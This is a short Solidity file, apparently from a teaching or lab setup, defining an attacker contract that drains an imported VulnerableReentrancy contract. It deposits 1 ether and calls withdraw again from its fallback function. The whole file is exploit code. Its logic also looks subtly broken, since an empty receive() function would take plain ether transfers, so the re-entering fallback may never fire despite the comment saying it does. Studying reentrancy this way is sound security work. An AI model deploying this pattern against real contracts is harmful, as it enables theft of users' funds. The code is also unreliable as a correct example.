// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableReentrancy.sol";

contract ReentrancyAttacker {
    VulnerableReentrancy public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableReentrancy(_vulnerableContract);
    }

    // Fallback function triggers re-entrancy
    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether); // Re-enter the contract
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Minimum 1 ether required");
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw(1 ether);
    }

    // Allow contract to receive Ether
    receive() external payable {}
}
